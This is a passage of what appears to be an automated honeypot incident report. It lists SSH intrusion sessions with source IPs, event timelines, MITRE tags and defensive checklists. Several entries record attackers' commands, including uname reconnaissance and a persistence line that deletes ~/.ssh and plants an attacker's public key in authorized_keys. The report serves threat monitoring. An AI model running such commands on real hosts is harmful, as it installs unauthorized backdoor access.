| `2026-09-25 18:13:36` | `cowrie.client.kex` |
| `2026-09-25 18:13:36` | `cowrie.login.success` |
| `2026-09-25 18:13:37` | `cowrie.session.params` |
| `2026-09-25 18:13:37` | `cowrie.command.input` |
| `2026-09-25 18:13:37` | `cowrie.log.closed` |
| `2026-09-25 18:13:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5610cd189ce

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:15 |
| **Last Seen** | 2026-09-25 18:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:15:23` | `cowrie.session.connect` |
| `2026-09-25 18:15:23` | `cowrie.client.version` |
| `2026-09-25 18:15:23` | `cowrie.client.kex` |
| `2026-09-25 18:15:23` | `cowrie.login.success` |
| `2026-09-25 18:15:24` | `cowrie.session.params` |
| `2026-09-25 18:15:24` | `cowrie.command.input` |
| `2026-09-25 18:15:24` | `cowrie.log.closed` |
| `2026-09-25 18:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31587061cf3b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:17 |
| **Last Seen** | 2026-09-25 18:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:17:05` | `cowrie.session.connect` |
| `2026-09-25 18:17:05` | `cowrie.client.version` |
| `2026-09-25 18:17:05` | `cowrie.client.kex` |
| `2026-09-25 18:17:05` | `cowrie.login.success` |
| `2026-09-25 18:17:06` | `cowrie.session.params` |
| `2026-09-25 18:17:06` | `cowrie.command.input` |
| `2026-09-25 18:17:06` | `cowrie.log.closed` |
| `2026-09-25 18:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c70c4492d16

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-25 18:18 |
| **Last Seen** | 2026-09-25 18:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:18:02` | `cowrie.session.connect` |
| `2026-09-25 18:18:02` | `cowrie.client.version` |
| `2026-09-25 18:18:02` | `cowrie.client.kex` |
| `2026-09-25 18:18:03` | `cowrie.login.success` |
| `2026-09-25 18:18:06` | `cowrie.direct-tcpip.request` |
| `2026-09-25 18:18:06` | `cowrie.direct-tcpip.ja4` |
| `2026-09-25 18:18:06` | `cowrie.direct-tcpip.data` |
| `2026-09-25 18:18:06` | `cowrie.direct-tcpip.request` |
| `2026-09-25 18:18:06` | `cowrie.direct-tcpip.ja4` |
| `2026-09-25 18:18:06` | `cowrie.direct-tcpip.data` |
| `2026-09-25 18:18:07` | `cowrie.direct-tcpip.request` |
| `2026-09-25 18:18:08` | `cowrie.direct-tcpip.ja4` |
| `2026-09-25 18:18:08` | `cowrie.direct-tcpip.data` |
| `2026-09-25 18:18:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3796f4fa769e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:18 |
| **Last Seen** | 2026-09-25 18:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:18:40` | `cowrie.session.connect` |
| `2026-09-25 18:18:40` | `cowrie.client.version` |
| `2026-09-25 18:18:40` | `cowrie.client.kex` |
| `2026-09-25 18:18:41` | `cowrie.login.success` |
| `2026-09-25 18:18:42` | `cowrie.session.params` |
| `2026-09-25 18:18:42` | `cowrie.command.input` |
| `2026-09-25 18:18:42` | `cowrie.log.closed` |
| `2026-09-25 18:18:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-845b8b0da252

| Field | Detail |
|---|---|
| **Source IP** | `103.163.118[.]115` |
| **First Seen** | 2026-09-25 18:20 |
| **Last Seen** | 2026-09-25 18:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:20:13` | `cowrie.session.connect` |
| `2026-09-25 18:20:13` | `cowrie.client.version` |
| `2026-09-25 18:20:13` | `cowrie.client.kex` |
| `2026-09-25 18:20:14` | `cowrie.login.success` |
| `2026-09-25 18:20:15` | `cowrie.session.params` |
| `2026-09-25 18:20:15` | `cowrie.command.input` |
| `2026-09-25 18:20:15` | `cowrie.command.failed` |
| `2026-09-25 18:20:16` | `cowrie.log.closed` |
| `2026-09-25 18:20:16` | `cowrie.session.params` |
| `2026-09-25 18:20:16` | `cowrie.command.input` |
| `2026-09-25 18:20:17` | `cowrie.session.file_download` |
| `2026-09-25 18:20:17` | `cowrie.log.closed` |
| `2026-09-25 18:20:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.118[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.163.118[.]115` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33fa2f44e370

| Field | Detail |
|---|---|
| **Source IP** | `103.163.118[.]115` |
| **First Seen** | 2026-09-25 18:20 |
| **Last Seen** | 2026-09-25 18:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:20:17` | `cowrie.session.connect` |
| `2026-09-25 18:20:17` | `cowrie.client.version` |
| `2026-09-25 18:20:17` | `cowrie.client.kex` |
| `2026-09-25 18:20:18` | `cowrie.login.success` |
| `2026-09-25 18:20:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.118[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.163.118[.]115` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27c2dc8ac54c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:20 |
| **Last Seen** | 2026-09-25 18:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:20:18` | `cowrie.session.connect` |
| `2026-09-25 18:20:18` | `cowrie.client.version` |
| `2026-09-25 18:20:18` | `cowrie.client.kex` |
| `2026-09-25 18:20:18` | `cowrie.login.success` |
| `2026-09-25 18:20:19` | `cowrie.session.params` |
| `2026-09-25 18:20:19` | `cowrie.command.input` |
| `2026-09-25 18:20:19` | `cowrie.log.closed` |
| `2026-09-25 18:20:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa73f82c5949

| Field | Detail |
|---|---|
| **Source IP** | `103.163.118[.]115` |
| **First Seen** | 2026-09-25 18:20 |
| **Last Seen** | 2026-09-25 18:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:20:19` | `cowrie.session.connect` |
| `2026-09-25 18:20:19` | `cowrie.client.version` |
| `2026-09-25 18:20:19` | `cowrie.client.kex` |
| `2026-09-25 18:20:20` | `cowrie.login.success` |
| `2026-09-25 18:20:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.118[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.163.118[.]115` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b380ebb53dbd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:20 |
| **Last Seen** | 2026-09-25 18:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:20:27` | `cowrie.session.connect` |
| `2026-09-25 18:20:27` | `cowrie.client.version` |
| `2026-09-25 18:20:27` | `cowrie.client.kex` |
| `2026-09-25 18:20:30` | `cowrie.login.success` |
| `2026-09-25 18:20:31` | `cowrie.session.params` |
| `2026-09-25 18:20:31` | `cowrie.command.input` |
| `2026-09-25 18:20:31` | `cowrie.command.input` |
| `2026-09-25 18:20:31` | `cowrie.command.input` |
| `2026-09-25 18:20:31` | `cowrie.command.input` |
| `2026-09-25 18:20:31` | `cowrie.command.input` |
| `2026-09-25 18:20:31` | `cowrie.command.success` |
| `2026-09-25 18:20:31` | `cowrie.command.input` |
| `2026-09-25 18:20:31` | `cowrie.command.input` |
| `2026-09-25 18:20:31` | `cowrie.command.input` |
| `2026-09-25 18:20:31` | `cowrie.command.input` |
| `2026-09-25 18:20:31` | `cowrie.log.closed` |
| `2026-09-25 18:20:33` | `cowrie.session.params` |
| `2026-09-25 18:20:33` | `cowrie.command.input` |
| `2026-09-25 18:20:34` | `cowrie.log.closed` |
| `2026-09-25 18:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4216f283a4a9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:21 |
| **Last Seen** | 2026-09-25 18:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:21:58` | `cowrie.session.connect` |
| `2026-09-25 18:21:58` | `cowrie.client.version` |
| `2026-09-25 18:21:59` | `cowrie.client.kex` |
| `2026-09-25 18:21:59` | `cowrie.login.success` |
| `2026-09-25 18:22:00` | `cowrie.session.params` |
| `2026-09-25 18:22:00` | `cowrie.command.input` |
| `2026-09-25 18:22:00` | `cowrie.log.closed` |
| `2026-09-25 18:22:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36e53a689f2b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:22 |
| **Last Seen** | 2026-09-25 18:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:22:25` | `cowrie.session.connect` |
| `2026-09-25 18:22:25` | `cowrie.client.version` |
| `2026-09-25 18:22:25` | `cowrie.client.kex` |
| `2026-09-25 18:22:27` | `cowrie.login.success` |
| `2026-09-25 18:22:29` | `cowrie.session.params` |
| `2026-09-25 18:22:29` | `cowrie.command.input` |
| `2026-09-25 18:22:29` | `cowrie.command.input` |
| `2026-09-25 18:22:29` | `cowrie.command.input` |
| `2026-09-25 18:22:29` | `cowrie.command.input` |
| `2026-09-25 18:22:29` | `cowrie.command.input` |
| `2026-09-25 18:22:29` | `cowrie.command.success` |
| `2026-09-25 18:22:29` | `cowrie.command.input` |
| `2026-09-25 18:22:29` | `cowrie.command.input` |
| `2026-09-25 18:22:29` | `cowrie.command.input` |
| `2026-09-25 18:22:29` | `cowrie.command.input` |
| `2026-09-25 18:22:30` | `cowrie.log.closed` |
| `2026-09-25 18:22:31` | `cowrie.session.params` |
| `2026-09-25 18:22:31` | `cowrie.command.input` |
| `2026-09-25 18:22:32` | `cowrie.log.closed` |
| `2026-09-25 18:22:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae2ae2bac9e3

| Field | Detail |
|---|---|
| **Source IP** | `149.34.48[.]31` |
| **First Seen** | 2026-09-25 18:23 |
| **Last Seen** | 2026-09-25 18:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:23:12` | `cowrie.session.connect` |
| `2026-09-25 18:23:12` | `cowrie.client.version` |
| `2026-09-25 18:23:12` | `cowrie.client.kex` |
| `2026-09-25 18:23:12` | `cowrie.login.success` |
| `2026-09-25 18:23:13` | `cowrie.session.params` |
| `2026-09-25 18:23:13` | `cowrie.command.input` |
| `2026-09-25 18:23:13` | `cowrie.command.failed` |
| `2026-09-25 18:23:13` | `cowrie.log.closed` |
| `2026-09-25 18:23:14` | `cowrie.session.params` |
| `2026-09-25 18:23:14` | `cowrie.command.input` |
| `2026-09-25 18:23:14` | `cowrie.session.file_download` |
| `2026-09-25 18:23:14` | `cowrie.log.closed` |
| `2026-09-25 18:23:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.34.48[.]31` to AbuseIPDB if not already reported
- [ ] Block `149.34.48[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82558c210773

| Field | Detail |
|---|---|
| **Source IP** | `149.34.48[.]31` |
| **First Seen** | 2026-09-25 18:23 |
| **Last Seen** | 2026-09-25 18:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:23:14` | `cowrie.session.connect` |
| `2026-09-25 18:23:14` | `cowrie.client.version` |
| `2026-09-25 18:23:14` | `cowrie.client.kex` |
| `2026-09-25 18:23:15` | `cowrie.login.success` |
| `2026-09-25 18:23:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.34.48[.]31` to AbuseIPDB if not already reported
- [ ] Block `149.34.48[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a696fca39c88

| Field | Detail |
|---|---|
| **Source IP** | `149.34.48[.]31` |
| **First Seen** | 2026-09-25 18:23 |
| **Last Seen** | 2026-09-25 18:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:23:15` | `cowrie.session.connect` |
| `2026-09-25 18:23:15` | `cowrie.client.version` |
| `2026-09-25 18:23:15` | `cowrie.client.kex` |
| `2026-09-25 18:23:15` | `cowrie.login.success` |
| `2026-09-25 18:23:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.34.48[.]31` to AbuseIPDB if not already reported
- [ ] Block `149.34.48[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afe493e4d11e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:23 |
| **Last Seen** | 2026-09-25 18:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:23:37` | `cowrie.session.connect` |
| `2026-09-25 18:23:37` | `cowrie.client.version` |
| `2026-09-25 18:23:37` | `cowrie.client.kex` |
| `2026-09-25 18:23:37` | `cowrie.login.success` |
| `2026-09-25 18:23:38` | `cowrie.session.params` |
| `2026-09-25 18:23:38` | `cowrie.command.input` |
| `2026-09-25 18:23:38` | `cowrie.log.closed` |
| `2026-09-25 18:23:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7891d59cfe1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:24 |
| **Last Seen** | 2026-09-25 18:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:24:19` | `cowrie.session.connect` |
| `2026-09-25 18:24:19` | `cowrie.client.version` |
| `2026-09-25 18:24:19` | `cowrie.client.kex` |
| `2026-09-25 18:24:21` | `cowrie.login.success` |
| `2026-09-25 18:24:22` | `cowrie.session.params` |
| `2026-09-25 18:24:22` | `cowrie.command.input` |
| `2026-09-25 18:24:22` | `cowrie.command.input` |
| `2026-09-25 18:24:22` | `cowrie.command.input` |
| `2026-09-25 18:24:22` | `cowrie.command.input` |
| `2026-09-25 18:24:22` | `cowrie.command.input` |
| `2026-09-25 18:24:22` | `cowrie.command.success` |
| `2026-09-25 18:24:22` | `cowrie.command.input` |
| `2026-09-25 18:24:22` | `cowrie.command.input` |
| `2026-09-25 18:24:22` | `cowrie.command.input` |
| `2026-09-25 18:24:22` | `cowrie.command.input` |
| `2026-09-25 18:24:23` | `cowrie.log.closed` |
| `2026-09-25 18:24:25` | `cowrie.session.params` |
| `2026-09-25 18:24:25` | `cowrie.command.input` |
| `2026-09-25 18:24:25` | `cowrie.log.closed` |
| `2026-09-25 18:24:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c1aa131eb59

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:25 |
| **Last Seen** | 2026-09-25 18:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:25:11` | `cowrie.session.connect` |
| `2026-09-25 18:25:11` | `cowrie.client.version` |
| `2026-09-25 18:25:11` | `cowrie.client.kex` |
| `2026-09-25 18:25:12` | `cowrie.login.success` |
| `2026-09-25 18:25:12` | `cowrie.session.params` |
| `2026-09-25 18:25:12` | `cowrie.command.input` |
| `2026-09-25 18:25:13` | `cowrie.log.closed` |
| `2026-09-25 18:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0598470d5372

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:26 |
| **Last Seen** | 2026-09-25 18:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:26:11` | `cowrie.session.connect` |
| `2026-09-25 18:26:11` | `cowrie.client.version` |
| `2026-09-25 18:26:11` | `cowrie.client.kex` |
| `2026-09-25 18:26:11` | `cowrie.login.success` |
| `2026-09-25 18:26:13` | `cowrie.session.params` |
| `2026-09-25 18:26:13` | `cowrie.command.input` |
| `2026-09-25 18:26:13` | `cowrie.command.input` |
| `2026-09-25 18:26:13` | `cowrie.command.input` |
| `2026-09-25 18:26:13` | `cowrie.command.input` |
| `2026-09-25 18:26:13` | `cowrie.command.input` |
| `2026-09-25 18:26:13` | `cowrie.command.success` |
| `2026-09-25 18:26:13` | `cowrie.command.input` |
| `2026-09-25 18:26:13` | `cowrie.command.input` |
| `2026-09-25 18:26:13` | `cowrie.command.input` |
| `2026-09-25 18:26:13` | `cowrie.command.input` |
| `2026-09-25 18:26:13` | `cowrie.log.closed` |
| `2026-09-25 18:26:15` | `cowrie.session.params` |
| `2026-09-25 18:26:15` | `cowrie.command.input` |
| `2026-09-25 18:26:16` | `cowrie.log.closed` |
| `2026-09-25 18:26:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26b82802e074

| Field | Detail |
